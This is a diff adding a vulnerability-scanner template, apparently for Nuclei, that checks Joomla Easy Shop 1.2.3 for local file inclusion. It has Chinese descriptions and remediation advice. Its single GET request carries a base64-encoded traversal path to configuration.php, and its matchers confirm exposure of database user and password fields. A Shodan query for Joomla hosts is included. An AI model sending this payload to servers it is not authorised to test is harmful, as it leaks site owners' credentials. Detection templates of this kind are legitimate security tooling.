@@ -1,0 +1,32 @@
+id: joomla-component-easy-shop-1-2-3-lfi
+
+info:
+  name: "Joomla! Component Easy Shop 1.2.3 本地文件包含"
+  author: ritikchaddha
+  severity: high
+  description: |
+    Joomla! component Easy Shop 1.2.3 存在本地文件包含（LFI）漏洞，攻击者可利用该漏洞读取服务器上的任意文件，导致敏感信息泄露。
+  reference:
+    - https://blog.csdn.net/weixin_42628854/article/details/136036109
+  classification:
+    cwe-id: CWE-23,CWE-73
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.component:"Joomla"
+  tags: Joomla
+  remediation: >-
+    升级到已修复版本，对路径进行规范化，并校验其是否位于允许的基础目录内；拒绝目录遍历序列，并将敏感文件放置在应用不可读取的目录中。在完成修复前限制对受影响端点的访问。
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA="
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body, "<?php", "class JConfig {")'
+          - 'contains_any(body, "$user", "$password", "$dbtype")'
+          - 'status_code == 200'
+        condition: and
+        # digest: 4b0a004830460221009eaf2b668b53e2799b94f59a227c43ac166fd6b2404d1ae1b61c5aa03961ea72022100cea771ac7b96e31faab394a049053415bd7d06ccc513f9aaff74630bc6071d67:922c64590222798bb761d5b6d8e72950
